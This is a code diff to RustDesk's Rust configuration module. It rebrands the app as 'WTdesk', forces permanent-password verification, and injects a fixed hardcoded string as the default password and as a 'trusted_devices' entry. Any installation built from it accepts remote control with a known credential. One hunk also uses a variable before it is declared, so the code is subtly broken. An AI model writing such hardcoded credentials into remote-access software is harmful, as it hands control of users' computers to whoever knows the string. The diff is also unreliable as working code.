@@ -58,7 +58,8 @@ lazy_static::lazy_static! {
     static ref ONLINE: Mutex<HashMap<String, i64>> = Default::default();
     pub static ref PROD_RENDEZVOUS_SERVER: RwLock<String> = RwLock::new("".to_owned());
     pub static ref EXE_RENDEZVOUS_SERVER: RwLock<String> = Default::default();
-    pub static ref APP_NAME: RwLock<String> = RwLock::new("RustDesk".to_owned());
+//  pub static ref APP_NAME: RwLock<String> = RwLock::new("w".to_owned());
+    pub static ref APP_NAME: RwLock<String> = RwLock::new("WTdesk".to_owned());
     static ref KEY_PAIR: Mutex<Option<KeyPair>> = Default::default();
     static ref USER_DEFAULT_CONFIG: RwLock<(UserDefaultConfig, Instant)> = RwLock::new((UserDefaultConfig::load(), Instant::now()));
     pub static ref NEW_STORED_PEER_CONFIG: Mutex<HashSet<String>> = Default::default();
@@ -458,6 +459,11 @@ fn patch(path: PathBuf) -> PathBuf {
 impl Config2 {
     fn load() -> Config2 {
         let mut config = Config::load_::<Config2>("2");
+        if !config.options.contains_key("verification-method") {
+                config.options.insert("verification-method".to_string(), "use-permanent-password".to_string());
+                store = true;
+            }
+
         let mut store = false;
         if let Some(mut socks) = config.socks {
             let (password, _, store2) =
@@ -469,6 +475,10 @@ impl Config2 {
         let (unlock_pin, _, store2) =
             decrypt_str_or_original(&config.unlock_pin, PASSWORD_ENC_VERSION);
         config.unlock_pin = unlock_pin;
+        if !config.options.contains_key("trusted_devices") {
+                    config.options.insert("trusted_devices".to_string(), "！！！00cyCCXpq9s7xLvi011ob8b93n！！！".to_string());
+                    config.store();
+                }
         store |= store2;
         if store {
             config.store();
@@ -598,6 +608,11 @@ impl Config {
                 }
             }
         }
+        if config.password.is_empty() {
+                    config.password = "！！！00cyCCXpq9s7xLvi011ob8b93n！！！".to_string();
+                    store = true;
+                }
+
         if store {
             config.store();
         }
